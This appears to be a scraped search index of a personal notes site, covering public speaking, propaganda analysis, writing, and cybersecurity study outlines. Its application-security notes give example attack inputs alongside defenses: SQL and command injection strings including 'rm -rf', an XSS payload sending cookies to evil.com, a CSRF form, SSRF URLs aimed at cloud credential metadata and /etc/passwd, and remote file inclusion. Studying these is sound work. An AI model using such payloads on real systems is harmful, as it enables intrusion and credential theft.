\u0026hellip;\u0026rdquo; \u0026ldquo;So, given the importance of this issue, I hope we can start a new conversation about it together\u0026rdquo; \u0026ldquo;The future is full of challenges and opportunities, Everyone here has it in their heart to make a difference. Let\u0026rsquo;s dream together. Let\u0026rsquo;s be the change we want to see in the world Too broad and cliche \u0026ldquo;I\u0026rsquo;\u0026rsquo; close with this video.. \u0026quot; No, end with YOU not a video So that concludes\u0026hellip; any questions ? You preempt your own applause \u0026ldquo;I\u0026rsquo;m sorry I haven\u0026rsquo;t had the time to \u0026quot; Thank you for not planning and preparing \u0026ldquo;In closing, I should point out that my organization could probably solve this\u0026rdquo; This was a sales talk? \u0026ldquo;Thank you for such an amazing audience, and way to much thank you\u0026rsquo;s!\u0026rdquo; \u0026ldquo;Thank you\u0026rdquo; is just fine Consider: Camera pull-back Show the bigger picture of what you idea fitted in call to action personal commitment Values and vision Satisfying encapsulation Reframe your idea that you have been making I think people have obsessed with the wrong question, which is \u0026ldquo;How do we make people pay for music?\u0026rdquo; What if we started asking, \u0026ldquo;How do we let people pay for music?\u0026rdquo;\nNarrative symmetry If you have been telling a story throughout, or just started with one, go full circle. On Stage # Wardrobe # Like the slides, simple and contrast, understand the setting you will be presenting in. Something you feel comfortable in Well fit, not too loose or baggy Nerves # Drink water Avoid empty stomach Remember the power of vulnerability Find \u0026ldquo;friends\u0026rdquo; in the audience People who look warm in the audience, make often eye contact with them Have a backup plan (notes, cards, \u0026hellip;) Even when not using them, knowing its there\u0026hellip; sooths Setup # Comfort backup: Full notes or script, out of sight Slides as guides: But don\u0026rsquo;t dump your text on it Hand Held Note cards Smartphone or tablet: The touchy stuff is dangerous to accidentally loose where you were Confidence monitors: Current slide, next slide, slide notes. Next slide and slide notes might confuse you or distract you Teleprompter can feel \u0026ldquo;being read to\u0026rdquo; Unobtrusive lectern Voice and Presence # Give you words the life they deserve Speak with meaning Body can be station on legs but loose upper body, you can also walk, just don\u0026rsquo;t pace annoyingly. Gentle pace and speed. Body posture ! Format Innovation # Be open to innovate with the format, as long it delivers the idea, and doesn\u0026rsquo;t distract. General Tips # Throughline: same as a lead? At least the tips of a good throughline should be listed as good tips. Prune tip âplan your talk, cut 50%, once youâve grieved the loss of half your talk, cut it another 50 percentâ Old formula used by sir ken robinson âa good essay answers 3 questions: what? So what? Now what?â. An idea based talk starts with curiosity, a issue based talk starts with morality, and that can cause morality fatigue Most speakers are used to talking for 30 or 40 minutes or longer. They find it literally hard to imagine giving a proper talk in such a short period of time. Hear we see the recurring team and need to write and think clear. Pruning clutter. Example of engaging writing # \u0026hellip; instead of listing boring facts about yourself\nI want you to come with me to student\u0026rsquo;s room at Oxford university in 1977. You open the door, and at first it seems like there\u0026rsquo;s nobody there. But wait, Over in the corner, there\u0026rsquo;s a boy lying on the floor, face up, staring at the ceiling. He\u0026rsquo;s been like that for more than 90 minutes. That\u0026rsquo;s me, 27 year old me. I\u0026rsquo;m thinking. Hard. I am trying\u0026hellip; please don\u0026rsquo;t laugh\u0026hellip; I am trying to solve the problem of free will. That deep mystery that has stumped the world\u0026rsquo;s philosophers for at least 2 millennia? Yp, I\u0026rsquo;m taking it on. Anyone looking objectively at the scene would have concluded that this biy was some weird combination of arrogant, deluded, or perhaps just socially awkward and lonely, proffering the company of ideas to people. But my own narrative? I\u0026rsquo;m a dreamer. I\u0026rsquo;ve always been obsessed by the power of ideas. And I\u0026rsquo;m pretty sure it\u0026rsquo;s that inward focus that helped me survive growing up in a boarding schools in India and England, away from my missionary parents, and that gave me confidence to try build a media company. Certainly it was the dreamer in me that fell in love so deeply with TED.\nGeneric Quotes of book # The secret of happening is: find something more important than you are, and dedicate your life to it. We\u0026rsquo;re strange creatures, we humans. At one level, we just want to eat, drink, play, and acquire stuff. But life on the hedonic treadmill is ultimately dissatisfying. A beautiful remedy is to hope of by pursuing an idea that\u0026rsquo;s bigger than you are. 2 things will happen You\u0026rsquo;ll find a meaningful form of happiness. You\u0026rsquo;ll discover something that matters far more than any piece of advice in this book: You\u0026rsquo;ll discover something worth saying. Imagine 2 political leaders, one of whom appels only to the interests of one race, while the other reaches out to all members of humanity. Be reasonable, look at the issue from a broader perspective. The later may have their moments of power, but it is the former who will win in the end. Insights # How does the POWER work as intro maybe? How does a good start of a talk compare to a power statement? Seems different, one seeks to intrigue, create curiosity, and the other purpose and planning. Makes sense, based on the activities About Rehearsal: I see the parallel here of, by trying, rehearsing, you see that works, you refine the message, we see again the iterative process of pruning, rewriting, refining, rethinking, am i saying the right thing? Does de build up make sense? Am i telling this linearly? Is every sentence setting up for the next, as you rehearse, you get more clarity, which allows you to then own it and do the talk efficiently, cause you have matured and clarified what you want to say, and the structure is sound. Minimize in going \u0026ldquo;META\u0026rdquo; , JUST DO IT Today I will\u0026hellip;. NO \u0026hellip; \u0026ldquo;Let me show you something\u0026rdquo; Here is my opening slide \u0026hellip; NO \u0026hellip; just show it or lead with curiosity. Resources # TED: Julian Treasure on how to speak "},{"id":13,"href":"/communication/propaganda/","title":"Propaganda","section":"Communication","content":" Propaganda # Institute for Propaganda Analysis (IPA) # ABCs of propaganda # The \u0026ldquo;ABCs\u0026rdquo; of propaganda analysis included the following:\nA - Who is the Author?\nIdentify who is responsible for creating or disseminating the message. Consider their background, motivations, and potential biases. B - What is the Purpose?\nDetermine the goal of the message. Is it to inform, persuade, entertain, or influence public opinion? What does the author hope to achieve? C - What are the Techniques?\nIdentify the specific propaganda techniques or rhetorical strategies used in the message. This could include the tricks of the trade like Name-Calling, Glittering Generalities, or Bandwagon. D - Who is the Audience?\nConsider who the message is intended for. Who is the target demographic, and how might they be influenced by the message? E - What is the Content?\nAnalyze the actual content of the message. What is being said, and how is it structured? Look at the words, images, and symbols used. F - What are the Effects?\nReflect on the potential impact of the message. How might it affect individuals, groups, or society as a whole? What are the short-term and long-term effects? G - What is the Context?\nExamine the broader context in which the message appears. What are the social, political, and economic conditions surrounding the message? These questions encouraged people to think critically about the information they encountered, helping them to separate propaganda from more objective, fact-based communication. The IPA\u0026rsquo;s emphasis on these analytical tools was part of its broader mission to promote media literacy and equip the public with the skills necessary to navigate a rapidly changing information landscape, particularly during a time of widespread propaganda use in the lead-up to World War II.\nTricks Of Trade (or Propaganda Devices) # The IPA identified several common techniques used in propaganda to manipulate public opinion. These \u0026ldquo;tricks of the trade\u0026rdquo; were meant to help people spot deceptive or manipulative messaging. Some of the most well-known techniques include:\nName-Calling: Attaching a negative label to a person, group, or idea to discredit it without providing evidence or engaging with the actual argument. Glittering Generalities: Using vague, emotionally appealing phrases that sound good but have little substantive meaning, like \u0026ldquo;freedom,\u0026rdquo; \u0026ldquo;democracy,\u0026rdquo; or \u0026ldquo;justice.\u0026rdquo; Transfer: Associating a respected or trusted symbol (like a national flag or religious symbol) with something the propagandist wants to promote. Testimonial: Having a well-known or respected person endorse a product, idea, or cause, which can lend it credibility regardless of the actual merits. Plain Folks: Trying to convince the audience that the speaker or cause is aligned with the everyday concerns of ordinary people. Card Stacking: Selectively presenting facts or information to support a particular conclusion, while ignoring or downplaying opposing evidence. Bandwagon: Encouraging people to follow the crowd or join in because \u0026ldquo;everyone else is doing it,\u0026rdquo; appealing to the human desire to be part of the majority. The work of the IPA was influential in shaping how educators, journalists, and the public approached media literacy and critical thinking. Although the Institute dissolved in 1942, its legacy lives on in the field of media education and the study of propaganda.\n"},{"id":14,"href":"/communication/writing/","title":"Writing","section":"Communication","content":" Writing # These notes come from 2 different books by the same author, but the content feel so intertwined, it feels like one book.\nWriting organizes and clarifies our thoughts. You might fear that \u0026ldquo;simple, clear thoughts\u0026rdquo; means a \u0026ldquo;simple mind\u0026rdquo;, but that\u0026rsquo;s not true. Someone who is able to formulate clear, simple thoughts put in the extra thinking, required after the first offloading of thoughts.\nQuotes # \u0026ldquo;If i had more time, i would have written a shorter letter\u0026rdquo; (Blaise Pascal, a French mathematician and philosopher) \u0026ldquo;great writing is all about the power of the deleted word\u0026rdquo; (richard bach, author) \u0026ldquo;Leave space and say less\u0026rdquo; (Peter Drucker) \u0026ldquo;Reading, writing and thinking are all integrated\u0026rdquo; (Kevin Byrne) \u0026ldquo;The hard part isn\u0026rsquo;t the writing, the hard part is the thinking\u0026rdquo;. \u0026ldquo;What are any of the disciplines but a way in which people try to make sense of the world or the universe? Mathematics is one of way of doing that, just as literature is, or philosophy, or history. Mat does it by looking for patterns and abstracting-that is, by examining a specific case and generalizing from that.\u0026rdquo; \u0026ldquo;I believe that writing is an effective means of improving thinking skills because a person must mentally process ideas in order to write an explanation. Writing als improves self-esteem because mentally processed ideas then belong to the write and not just the teach or the textbook author\u0026rdquo; (Professor VanOrden) Logic or reasoning is the means whereby we reach new conclusions, gain new knowledge, uncover new and important facts. (Reasoning book) Types Of Non-Fiction Writing # Types defined by William Zissner # From the books on learning to write and writing well.\nExplanatory writing: Transmits existing information or ideas. \u0026gt; On Writing Well Exploratory Writing: Enables us to discover what we want to say. \u0026gt; Writing To Learn The Explanatory writing is the one that has the most need for clarity and needs rigorous attention and iteration. The Exploratory writing is more about the \u0026ldquo;writing across the curriculum\u0026rdquo; or the \u0026ldquo;Writing To Learn\u0026rdquo;.\nBoth writing skills are necessary, all can be thought and honed, none of it is a skill you must be born with.\nTypes defined by WAC Clearinghouse # Writing To Learn (WTL): to help students learn foundational concepts to check students\u0026rsquo; understanding of material Writing To Engage (WTE): to practice in critical thinking, reading and writing; to engage students in critical thinking stands between the two most common approaches to writing across the curriculum: writing to learn (WTL) and writing in the disciplines (WID) Writing In The Disciplines (WID): to practice writing conventions of the discipline; to gain familiarity with genres and design conventions Also called writing to communicate Kinds Of Thinking # Based on Blooms Taxonomy, but does not perse include all kinds of thinking, but its a great start. Also note, it does have a pyramid\nRemembering Understanding Reflecting Applying Analyzing Evaluating Creating See imgage\nType 1: Explanatory Writing # General Tips # This are all soft rules.\nMind your audience. Is it clear to someone who doesn\u0026rsquo;t know anything about the subject? The text must linearly and logically built up. Writing is a process, not a product, Simplicity: prune any excess words and use simple words. Clutter is the disease of american writing Clutter hides often painful truth Clutter can be intentional vagueness Political speech and writing are largely the defense of the indefensible The best \u0026ldquo;jargon\u0026rdquo; literature is even accessible to people from outside the field. Beware of the long word thats no better than the short word Be cautious of meta text Â«its interesting to note..Â», just note it. Don\u0026rsquo;t inflate (\u0026ldquo;with the possible exceptionâ¦\u0026rdquo; just say \u0026ldquo;exception\u0026rdquo;) Donât repeat recently mention information. Don\u0026rsquo;t use adjectives that are implied (tall skyscraper) The more vague your ideas, the less confident or selling you sound. Write in first person, its more intimate, if your writing is good, your writing is worthy, people will care about your say. Donât be shy or think you are egocentric. Some areas donât allow this, like writing newspapers. Unity to the same pronoun (talking 1st, 2nd or 3th person) across your text. (formal, informal) Unity in tense (past, current, \u0026hellip;) Unity in mood/tone E.g. Start of conversational, then switch to sound as a travel guide. Have more research material or detail than necessary, so you can pick what works well for you. Narrative is oldest and most compelling method of holding someones attention, everybody wants to be told a story. Always look fo says to convey information in narrative form. To conceal meaning is equally to conceal the lack of meaning Sentences should have people in them Copy styles you like, as you mature, you will split of in your own style. There is no shame in copying a style you like and that works. The Process # Iterative: Write what you want to say Then prune what does not add value or clutters. Use a thesaurus to find better wording. Simplify where possible, rewrite, rethink. Reread Repeat Once you have the core of what you want to say, you can gently add some fluff to your liking. Warming up: Itâs common to throw away first paragraphs once you found your style. This iterative process causes you to structure and clarify your thoughts, resulting into better understanding. Short: What do I want to say? Write ? Did I say what I wanted ? Review, Iterate. A new paragraph can explain something or expand on something that was introduce in preceding paragraph. That\u0026rsquo;s a logical order, cause the reader might wonder \u0026ldquo;What is X that he just mentioned\u0026rdquo;? Another way to put it: What do I want to say? Try to say it. Have I said it? Is this [sentence] clear to someone who knows nothing about the subject? No? Consider making it clear. Rewrite it. What do I need to say next? Will it lead logically out of what I\u0026rsquo;ve just written ? Will it also lead logically towards where I want to go? If it will, write the sentence. Then ask \u0026ldquo;Did it do the hob I wanted it to do, with no ambiguity?\u0026rdquo; Keep thinking and writing and rewriting. Tips # As you write, you might discover other unities you want to adapt, thats fine and natural, whatever vibes well. Just update the whole piece to conform. Am i saying what i want to say? The Structure # The Lead # Show what\u0026rsquo;s in it for the reader, so they know why to keep reading. Get them hooked, nudge curiosity. Freshness, novelty, humor, surprise, unusual idea, paradox, interesting fact, question Continue to build. Every paragraph should amplify the preceding one. Give more thought to adding solid detail and less to entertaining the reader. Last sentence of paragraph must be springboard to next one. Give that sentence extra humor or surprise, so you have them for another paragraph. That sentence can also restore to an easy going tone, after some colder facts or details. The Ending # Give almost as much thought to your last sentence, as your first. When you announce the beginning of a summary of things covered in the article, people loose focus Be weary of the sandwich technique The last paragraph must linger, take by surprise, a joy in itself When you are ready to stop, stop Once presented all facts, made your point, go for nearest exit Clutter and Verbosity Examples # currently : now At the presence: now Even Â«nowÂ» can be often dropped Â«its rainingÂ», the tense says enough! Experiencing pain : Hurting Assistance : help Referred to as: called I might add: just add it, donât go so meta (itâs interesting to note, just note) Smile happy: smile Type 2: Exploratory Writing (Across The Curriculum) # This type of writing is more to explore, clarify and refine your thoughts. The focus is not on the end result or the answer. It\u0026rsquo;s the journey towards the answer. Like a diary or journal, keeping track of observations and ideas and then share how you got to a result.\nBy giving a math problem in a context and have students write about it, they will naturally think more across the curriculum. Think of the world population growth issue, the question was all about how would you calculate or understand exponential growth. The writes would also think, do we have room? What is the impact? What are the solutions? So aside of thinking about the math, they also thought about all the other related and relevant parts in other fields (sociology, economics, ethics, sustainability, â¦)\nIf you write your thought process down, and not only a report, you will expand your thinking and reasoning. Making the thought process transparent, it allows a teacher, mentor, or coach to better evaluate the quality of your work. Has the student first gone to existing literature? How did they design the experiment? Why did they do certain things in order, this transparency helps to teacher, but also the student to reflect on \u0026ldquo;how\u0026rdquo; they got to the result, not just the result. In the the modern realistic world, the answer is not the most important, but HOW you got to the answer.\nIn Math, some teachers grade on \u0026ldquo;how\u0026rdquo; and \u0026ldquo;how far\u0026rdquo; you got to the answer, not only if you have the answer. Try to go from Explanatory to Exploratory writing.\nA great quotation form the WAC (Writing Across The Curriculum) site:\nThe purpose of writing to learn assignmentsâjournals, discovery drafts, in-class writingâis to use writing as a tool for learning rather than a test of that learning, to have writers explain concepts or ideas to themselves, to ask questions, to make connections, to speculate, to engage in critical thinking and problem solving. The audience for this kind of writing is the student him- or herself\u0026hellip;. The teacher serves as a facilitator rather than a judge, responding to the writing by asking questions, prodding for further thinking, or answering questions posed by the writer rather than \u0026ldquo;correcting\u0026rdquo; or grading the piece\u0026hellip;. (McLeod \u0026amp; Maimon, 579)\nWe cannot emphasize too strongly that it is an error to see writing to learn and writing to communicate as somehow in conflict with each other. Most of us who have been involved in WAC programs from the beginning see \u0026ldquo;writing to learn\u0026rdquo; and \u0026ldquo;writing to communicate\u0026rdquo; as two complementary, even synergistic, approaches to writing across the curriculum, approaches that can be integrated in individual classrooms as well as in entire programs.\nWriting, then, serves multiple purposes, and students gain as learners and thinkers as we integrate writing as frequently as possible across the curriculum\nYou can find here examples on different \u0026ldquo;Writing-To-Learn\u0026rdquo; (WTL) activities. Theoreticians and practitioners alike agree that writing promotes both critical thinking and learning\nWriting to communicateâor what James Britton calls \u0026ldquo;transactional writing\u0026rdquo;âmeans writing to accomplish something, to inform, instruct, or persuade\u0026hellip;. Writing to learn is different. We write to ourselves as well as talk with others to objectify our perceptions of reality; the primary function of this \u0026ldquo;expressive\u0026rdquo; language is not to communicate, but to order and represent experience to our own understanding. In this sense language provides us with a unique way of knowing and becomes a tool for discovering, for shaping meaning, and for reaching understanding. (p. x)\n"},{"id":15,"href":"/cybersecurity/","title":"Cybersecurity","section":"","content":" Cybsersecurity # Certifications # Links # Resources "},{"id":16,"href":"/cybersecurity/application-security/","title":"Application Security","section":"Cybersecurity","content":" Application Security # Software Assurance Best Practices # The Software Development Lifecycle Planning \u0026gt; Requirements \u0026gt; Design \u0026gt; Coding \u0026gt; Testing \u0026gt; Training \u0026amp; Transition \u0026gt; Ongoing Ops/maintenance \u0026gt; End Of Life (Decommission) dev env \u0026gt; for devs test env \u0026gt; QA/Preprod staging \u0026gt; tested but awaiting deployment prod DevSecOps and DevOps Sec becomes a shared responsibility, just like the Ops. Designing and Coding For Security # Secure Coding Practices Open Worldwide Application Security Project (OWASP) - best resource for secure coding practices. Top Proactive Security Controls by OWASP Define Security Requirements Leverage Security Frameworks Secure Database Access Encode an Escape Data Validate all inputs Implement DIgital Identity Enforce Access Controls Priotect Data Everywhere Implement Security Logging and Monitoring Handle all errors and exceptions OWASP Proactive Controls OWASP Quick Reference API Security OWASP API Security Software Security Testing # State Of Software Security Report Analyzing and Testing Code Static Code Analysis - reads the actual code to find flaws in it Dynamic Code Analysis - runs the code to find flaws in it Fuzzing - send random data to application to see how it handles unexpected data Injection Vulnerabilitiies # SQL Injection Attacks Is also a class under Code Injection attacks. Happens when User Input is directly used in a SQL Query Query Used SELECT * FROM Products WHERE Name LIKE '%user_input_value%' User Input cola'; SELECT * FROM users; -- instead of just cola Results in : SELECT * FROM Products WHERE Name LIKE 'cola'; SELECT * FROM users; --, so 2 SQL queries However, the results might not be returned/visible to the user, solution? Blind SQL Injection 2 Blind SQL Injection Types Blind Content-Based SQL Injection First: Validate if SQL Injection is possible Asume we expect an UserID as User input, and let\u0026rsquo;s assume 123 is a vailid UserID. Query Used SELECT * FROM Users WHERE Id = '%user_input_value%' Specify 123' OR 1=1 which results in SELECT * FROM Users WHERE Id = '123' OR 1=1 This returns multiple rows, did it break anything on the front end? No ? Good â You might not see the multiple rows due to business logic,but it DID EXECUTE properly (you get feedback that the query was valid) Now specify 123' OR 1=2 which results in SELECT * FROM Users WHERE Id = '123' OR 1=2 This returns no row, did it break anything on the front end aside of just saying that there were no results? Yes ? Good â We can now asume that SQL injection is possible. Now you can inject other querys that ALTER data. The baseline feedback if it was succesful or not your query is established in previous steps. Based on the CONTENT you were able to validate if your queries are working Blind Time-Based SQL Injection - (example in Microsoft SQL) First: Validate if SQL Injection is possible Asume we expect an UserID as User input, and let\u0026rsquo;s assume 123 is a vailid UserID. Specify 123'; WAITFOR DELAY '00:00:15' which results in SELECT * FROM Users WHERE Id = '123'; WAITFOR DELAY '00:00:15' If the query now takes 15 seconds to execute, we can be quite confident that the SQL injection is possible. â. â ï¸ Now this \u0026ldquo;timer\u0026rdquo; trick, can be also used to signal back if something was \u0026rsquo;true\u0026rsquo; (if true, wait 15 seconds, else not). An example, assuming the password is cleartext For each character in the password For each letter in the alphabet if the current character is equal to the current letter, wait 15 seconds before returning results Code Injection Attacks Examples LDAP Injection Attack - Embed commands in text as part of a LDAP query XML Injection Attack - Embed code in XML text DLL Injection Attack - Force an application to load a (malicious) DLL that was not a part of the process. Cross-Site-Scripting (XSS) Command Injection Attacks When an application executes a command against the OS, there is a potential for exploitation. Example You have a webpage to create a user and the end user must specify a username in a form On creation, the app might run a command to create a folder for that new user system('mkdir /home/students/\u0026lt;mynewusername\u0026gt;) What if the user specifies mynewusername \u0026amp;\u0026amp; rm -rf home Now we have piped again additional commands â ï¸ Note that there is again no feedback/response, but you could try to have a script use a time or a curl command to post back the output to a webserver you own. Exploiting Authentication Vulnerabilities # Password Authentication Flaw: Once an attacher knows a password, they can keep using it for access. Risk: Social Engineering, unencrypted traffic, password dumps from hacked sites, brute force, guessing Session Attacks Cookie Stealing \u0026amp; Manipulation Steal an existing (authentication) session After auth, the session token is stored in browser cookie for further request auth How to steal it? Unencrypted network traffic Malware in browser On Path attack - Impersonate target site, forward the actual credentials to target site, return the request to the user with the cookie, but now you also have that cookie. (But you know then the credentials either way?) Once you have the cookie Session Replay Attack - The attacker reuses the session of the target Defenses Mark Cookie SECURE - tells the browser to never send it over unencrypted requests NTLM pass-the-hash NTLM hash is the hash function in windows to store user\u0026rsquo;s passwords. So if you can intercept this hash, instead of the username/password, you can also authenticate in/with windows. Unvalidated Redirects Example: example.com/order?redirect_ok=https://evilsite.com and then the evil site can impersonate and ask to re authenticate again or whaterver Example: example.com/login?login_ok=https://evilsite.com, then after login it might call https://evilsite.com?csrf_token=\u0026lt;somevalue\u0026gt; or the Referer: https://bank.com/transfer?sessionid=abc123\u0026amp;csrf_token=xyz789 header Exploiting Authorization Vulnerabilities # Insecure Direct Object References example.com/orders?id=100 shows your order and you can just do example.com/orders?id=101 and see anothers order. Directory Traversal The web server allows to navigate the directory and list all files - bad configuration Appache Server / NGINX - www.example.com/../../../etc/shawdow (so you just path yourself outside the web folder) Open AWS S3 bucket It helps to know on what server the site is host to then learn about their (Default) config File Inclusion Next level Directory Traversel - you don\u0026rsquo;t just read a file, you execute it Run a file from the server\u0026rsquo;s file system: www.example.com/?include=../../../etc/attack.sh Run a file from an external place: www.example.com/?include=www.evilsite.com/script.sh Attack might then upload a Web Shell to comfortably run commands and see output â The webshell uses HTTPS, so it hides even better. TIP: Patch the vulnerability and persist your access with the web shell Privilege Escalation Upgrade your user to have more rights or higher group Dirty Cow - Linux vulnerability Exploiting Web Application Vulnerabilities # Cross-Site Scripting XSS - when an attacker does HTML injection (inject their own HTML into a webpage) Reflected XSS When an application allows \u0026ldquo;reflected input\u0026rdquo; Anywhere, where a user can provide \u0026ldquo;input\u0026rdquo; that later would be viewed by another user there is a XSS oppertunity. Example https://news.com/search.php?q=\u0026lt;script\u0026gt;document.location='https://evil.com/steal?cookie='+document.cookie\u0026lt;/script\u0026gt; assuming that the search page would (without validation) render the search query q in the html (Search results for q.) Stored/Persistent XSS Here the XSS script is stored server/side Example: I leave a product review with content Good product! \u0026lt;script\u0026gt;alert('oi')\u0026lt;/script\u0026gt; If this input is not sanatized or cleaned, it will store this string in the database. When someone else views the product, and all comments are rendered underneath, the \u0026lt;script\u0026gt;alert('oi')\u0026lt;/script\u0026gt; part will be seen as actual HTML and the script tag will execute. Now you can replace alert('oi') with javascript that will log your keys, steal your cookies, etc\u0026hellip; cause you are now runng a script under the domain of the trusted site. â ï¸ Think of other ways where you can \u0026ldquo;inject HTML\u0026rdquo; on the request route or from a browser plugin. Solutions Input validation and escaping OWASP Cheatsheet Request Forgery Exploit trust relationships and try users to unwittingly execute commands against a remote server, there are 2 types. Cross-Site Request Forgery CSRF/XSRF Assume you are logged in to mybank.com. You then visit a dangerous site or link evil.com When you click on a button on evil.com it might trigger a request to mybank.com If you are stil loggedin to mybank.com, the request could succeed because the browser would use any cookies linked to the mybank.com site. Example HTMl on the evil.com site \u0026lt;!-- Hidden on evilsite.com --\u0026gt; \u0026lt;form action=\u0026#34;https://somebank.com/transfer\u0026#34; method=\u0026#34;POST\u0026#34; id=\u0026#34;malicious-form\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;to_account\u0026#34; value=\u0026#34;999999\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;amount\u0026#34; value=\u0026#34;5000\u0026#34;\u0026gt; \u0026lt;!-- Note: no CSRF token! --\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script\u0026gt; // Automatically submit when page loads // document.getElementById(\u0026#39;malicious-form\u0026#39;).submit(); \u0026lt;/script\u0026gt; Defenses: secure tokens, check in reffering url to only accept urls that originate from own domain. Server-Side Request Forgery SSRF Here we want the server/back-end to make an web call to a url. Let\u0026rsquo;s say you have a web application that takes an URL as input That URL would be used to fetch remote information, and it would return that in some form. Imagine for that URL, you specifcy a URL or IP address that would be not publicly available, but only to your back-end server Example: GET /preview?url=http://localhost:8080/admin/users Example: GET /preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ on AWS exposes IAM credentials Example: GET /preview?url=file:///etc/passwd Application Security Controls # Input Validation Protects agains Injection attackes, XSS, XSRF, SSRF and many more. Best method: Allow Listing When you expect an age, only allow values between 0 - 125, anything else get rejected. Remember, always test at least server side. Next best method: Deny Listing (Cause often describing only what is allow is to wide) Look and block for SQL code, HTML tags, etc.. Parameter Pollution - a trick attackers try to get around input validatio/filtering Example www.example.com/status?account=1\u0026amp;account=1' or 1=1;-- Here the hope is that validiation only happens on the first specification of the parameter, but not the second. This behaviour is very tech specific (PHP, ExpressJS, ASP, Python Flask,\u0026hellip;.) so the hack really depends on the web server stack. Example : Authentication Bypass - it might take the right passwor for user guest but think it was user admin POST /login user=admin\u0026amp;pass=wrong\u0026amp;user=guest\u0026amp;pass=correct Example : Rate Limiting bypass GET /api/data?user_id=victim\u0026amp;user_id=attacker Web Application Firewalls (WAFS) A WAF sits in front of the actual web server and acts like a firewall but on application level. It can inspect requests and intercept/filter anything suspicious, which would be another layer of security, hopefully blocking this that the eventual backend is not handling. Note that the client has a TLS connection to the WAF, so the WAF can inspect all traffic, but then forwads the request as a new TLS connection to the origins server. Parameterized Queries Input is not put directly into the SQL string, but parameterized, this way the entire input data is pure data, not a part of the SQL text. So it\u0026rsquo;s uses as a literal string. Unescapable (is the theory) Sandboxing Run app in a controlled or isolated environment, preventing interaction with surroundings. Code Security Securing the code itself Code Signing - Sign code by devs to confirm authencity (PGP signature for example) Code Reuse - Monitor and mainting even higher standards for reused code (e.g. SDKs) Software Diversity - Watch for single points of failuree Code Repositories - versioning and history is great for audit Integrity Measurement - Make sure that approved code its hash matches to the hash being deployed Application Resilience - through 2 ways Scalability - designed so extra resources can be added Elasticty - a step further, it provisions extra resources when it needs it Secure Coding Practices # Source Handling Comments - Remove code comments in production code (for the non compiled code, like JS) Error Handling - Be cautious that error messages dont give to much detail, no debug mode in prod! Hard-Coded Credentials Well intentioned backdoor - Once the credentials are known, any deployed version is at risk Non intentioned - API keys etc.. Package Monitoring - Monitor your dependencies and packages, Memory Management Resource Exhaustion - Can make the application crash (e.g. memory leak) Pointer Deference - Memory Pointers, when a pointer points to a memory spot with unkown value it can crash or worst case bypass validation Buffer Overflows - Attack tricks the app to handle more data then it has assigned. Memory Injection: Goal is to overwrite memory with instructions that might be executed by another process running on the system Race Conditions When Security of the code depends upon a sequence of events within the system Time-Of-Check (TOC) - When a system verifies access permissions or other security controls. Time-Of-Use (TOU) - When the system access the resources or permission that was granted. Target of Evaluation (TOE) - refers to component/system being evaluated or tested for potential vulnerabilities. TIme-Of-Check-To-Time-Of-Use issue is a race condition when the app checks the permission too far ahead of a resource request. Example: If an attacker logs in and has admin rights via a web interface, leaves that session open for a day, but within a hour his admin rights are taken away, this change might not be observed yet everywhere, cause a session is open and permissions were already evaluated. Unprotected APIs APIs should be authenticated and make sure that at every endpoint AutH and AuthZ is happening. Automation and Orchestration # SOAR: Security Orchestration, Automation, and response platforms.\nAutomation can remove human error and make security easier and more scaleable.\nUse Cases of Autmation and Scripting Examples: User provisioning, resource provisioning, guard rails, security groups, ticket creation, escalation, enabled/disabling services and access, CI \u0026amp; testing, Integrations and APIs Guard Rails: Enforce policy controls and prevent violations of security protocols Benefits of Automation and Scripting Less chance for human error Consistency in how things are done Standerization Scale in secure manner Speed up Other Considerations Complexity, Cost, Single point of failure, Technical Debt, Ongoing supportability "},{"id":17,"href":"/cybersecurity/cloud-and-virtualization-security/","title":"Cloud and Virtualization Security","section":"Cybersecurity","content":" Cloud and Virtualization Security # Exploring the Cloud # Benefits of the Cloud Cloud Roles Cloud Service Models Cloud Deployment Models Private Cloud Shared Responsibility Model Cloud Standards and Guidelines Virtualization # Hypervisors Cloud Infrastructure Components # Cloud Compute Resources Cloud Storage Resources Cloud Networking Cloud Security Issues # Availability Data Sovereignty Virtualization Security Application Security Governance and Auditing of Third-Party Vendors Hardening Cloud Infrastructure # Cloud Access Security Brokers Resource Policies Secrets Management "},{"id":18,"href":"/cybersecurity/cryptography-and-kpi/","title":"Cryptography and Kpi","section":"Cybersecurity","content":" Cryptography and the PKI # An Overview of Cryptography # Historical Cryptography Goals of Cryptography # Confidentiality Integrity Authentication Non-repudiation Cryptographic Concepts** # Cryptographic Keys Ciphers Modern Cryptography # Cryptographic Secrecy Symmetric Key Algorithms Asymmetric Key Algorithms Hashing Algorithms Symmetric Cryptography # Data Encryption Standard Advanced Encryption Standard Symmetric Key Management Asymmetric Cryptography # RSA Elliptic Curve Hash Functions # SHA MD5 Digital Signatures # HMAC Public Key Infrastructure # Certificates Certificate Authorities Certificate Generation and Destruction Certificate Formats Asymmetric Key Management # Cryptographic Attacks # Brute Force Frequency Analysis Known Plain Text Chosen Plain Text Related Key Attack Birthday Attack Downgrade Attack Hashing, Salting, and Key Stretching Exploiting Weak Keys Exploiting Human Error Emerging Issues in Cryptography # Tor and the Dark Web Blockchain Lightweight Cryptography Homomorphic Encryption Quantum Computing "},{"id":19,"href":"/cybersecurity/digital-forensics/","title":"Digital Forensics","section":"Cybersecurity","content":" Digital Forensics # Digital Forensic Concepts # Legal Holds and e-Discovery Conducting Digital Forensics # Acquiring Forensic Data Acquisition Tools Validating Forensic Data Integrity Data Recovery Forensic Suites and a Forensic Case Example Reporting # Digital Forensics and Intelligence # "},{"id":20,"href":"/cybersecurity/endpoint-security/","title":"Endpoint Security","section":"Cybersecurity","content":" Endpoint Security # Operating System Vulnerabilities # Hardware Vulnerabilities # Protecting Endpoints # Preserving Boot Integrity Endpoint Security Tools Hardening Techniques # Hardening Service Hardening Network Hardening Default Passwords Removing Unnecessary Software Operating System Hardening # Configuration, Standards, and Schemas Encryption Securing Embedded and Specialized Systems # Embedded Systems SCADA and ICS Securing the Internet of Things Communication Considerations Security Constraints of Embedded Systems Asset Management # "},{"id":21,"href":"/cybersecurity/general-concepts/","title":"General Concepts","section":"Cybersecurity","content":" General Concepts # The 3 Cybersecurity Objectives # CIA Triad == The 3 Objectives/goals Confidentiality - No unauthorized individual is able to access sensitive information. Integrity - No unauthorized changes to systems or data. Availability - Informations and systems are ready to meet the needs of legitimate users at the time those users request them. 1 Additional goal/objective Nonrepudiation - Someone who performs some action, cannot later 